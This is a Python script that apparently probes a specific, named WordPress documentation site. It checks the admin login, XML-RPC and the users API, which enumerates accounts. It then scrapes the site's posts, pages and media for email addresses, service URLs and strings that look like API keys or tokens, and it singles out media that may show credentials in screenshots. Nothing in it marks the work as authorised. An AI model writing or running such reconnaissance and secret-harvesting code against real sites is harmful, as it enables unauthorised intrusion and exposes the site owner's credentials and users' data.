import requests, re

s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})

# WordPress admin
print("=== WordPress Admin ===")
r = s.get("https://docs.bcl.my/wp-admin", timeout=15)
print(f"Status: {r.status_code} -> {r.url}")

if "wp-login" in r.url:
    print("WordPress login accessible")
    r2 = s.get("https://docs.bcl.my/xmlrpc.php", timeout=10)
    print(f"XML-RPC: {r2.status_code}")
    r3 = s.get("https://docs.bcl.my/wp-json/wp/v2/users", timeout=10)
    print(f"Users API: {r3.status_code} - {r3.text[:300]}")

# Get ALL posts and extract hardcoded values
print("\n=== Extracting Hardcoded Data ===")
r = s.get("https://docs.bcl.my/wp-json/wp/v2/posts?per_page=50", timeout=15)
if r.status_code == 200:
    posts = r.json()
    for post in posts:
        title = post.get("title",{}).get("rendered","")
        content = post.get("content",{}).get("rendered","")
        link = post.get("link","")
        
        # Find all emails
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
        for e in set(emails):
            if "example.com" not in e and "bcl.my" not in e:
                print(f"  [EMAIL] {title}: {e}")
        
        # Find URLs to external services
        urls = re.findall(r'https?://[^\s"\'<>)]+', content)
        for u in set(urls):
            if any(x in u for x in ["bayar.cash", "console", "api.", "secret", "token", "key"]):
                print(f"  [URL] {title}: {u}")
        
        # Find potential keys
        keys = re.findall(r'[A-Za-z0-9_-]{20,50}', content)
        for k in set(keys):
            if any(x in k.lower() for x in ["key", "secret", "token", "sk_", "pk_", "pat_"]):
                print(f"  [KEY] {title}: {k}")

# Check for hidden pages
print("\n=== Other Pages ===")
r = s.get("https://docs.bcl.my/wp-json/wp/v2/pages?per_page=50", timeout=15)
if r.status_code == 200:
    pages = r.json()
    for page in pages:
        title = page.get("title",{}).get("rendered","")
        link = page.get("link","")
        print(f"  {title}: {link}")

# Check for media files that might contain screenshots with credentials
print("\n=== Media Files ===")
r = s.get("https://docs.bcl.my/wp-json/wp/v2/media?per_page=10", timeout=15)
if r.status_code == 200:
    media = r.json()
    for m in media:
        src = m.get("source_url","")
        title = m.get("title",{}).get("rendered","")
        print(f"  {title}: {src}")
